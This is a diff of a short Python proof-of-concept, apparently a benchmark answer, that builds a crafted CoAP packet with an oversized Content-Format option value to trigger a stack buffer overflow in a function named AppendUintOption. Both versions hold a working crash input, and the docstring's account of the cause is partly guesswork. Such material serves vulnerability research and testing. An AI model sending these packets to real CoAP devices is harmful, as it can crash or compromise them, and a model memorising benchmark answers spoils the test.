@@ -1,45 +1,27 @@
-import sys
+import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Stack Buffer Overflow in AppendUintOption.
-        The vulnerability likely occurs when a Uint option (like Content-Format) has
-        an unexpectedly large length, overflowing a fixed-size stack buffer.
-        
-        Target Length: 21 bytes.
+        Generate a PoC that triggers the stack buffer overflow in AppendUintOption.
+        The vulnerability is caused by writing an integer option value larger than the
+        internal stack buffer (likely 4 bytes) allocated for it.
+        We provide an 8-byte integer option value to trigger this.
         """
-        # CoAP Header (4 bytes)
-        # Ver: 1 (2 bits) -> 01
-        # Type: 0 (CON, 2 bits) -> 00
-        # TKL: 0 (4 bits) -> 0000
-        # Byte 0: 01000000 -> 0x40
-        # Code: 0x01 (GET)
-        # Message ID: 0x1234 (Arbitrary)
+        # CoAP Header: Ver=1(2b), T=CON(2b), TKL=0(4b) -> 0x40
+        # Code: GET (0x01)
+        # Message ID: 0x1234 (arbitrary)
         header = b'\x40\x01\x12\x34'
         
-        # Option Construction (17 bytes)
-        # We use Option ID 12 (Content-Format) which is a Uint option.
-        # We want to maximize the payload size to ensure overflow within the 21-byte limit.
-        # 21 bytes total - 4 bytes header = 17 bytes for the option.
-        # We need an option header.
-        # If we use Delta=12, Length=13, we use 1 byte for option header and 1 byte for extended length.
-        # This leaves 17 - 2 = 15 bytes for the payload.
-        # 15 bytes is significantly larger than typical Uint sizes (1, 2, 4, 8), likely causing the crash.
+        # Option: Content-Format (Option Number 12)
+        # This is a standard Uint option.
+        # Delta = 12 (0xC0 in upper nibble)
+        # Length = 8 (0x08 in lower nibble) -> Total 0xC8
+        # We use the maximum allowed integer length in CoAP (8 bytes) to overflow
+        # any smaller buffer (e.g., 4 bytes for uint32).
+        option_header = b'\xC8'
         
-        # Option Header Byte:
-        # Delta = 12 (1100)
-        # Length Nibble = 13 (1101) - indicates 8-bit extended length
-        # Byte: 0xCD
-        opt_header = b'\xCD'
+        # Option Value: 8 bytes of 0xFF
+        option_value = b'\xFF' * 8
         
-        # Extended Length Byte:
-        # Length = Value + 13. We want Length = 15.
-        # Value = 15 - 13 = 2.
-        ext_len = b'\x02'
-        
-        # Payload (15 bytes)
-        payload = b'A' * 15
-        
-        # Total: 4 + 1 + 1 + 15 = 21 bytes
-        return header + opt_header + ext_len + payload
+        return header + option_header + option_value
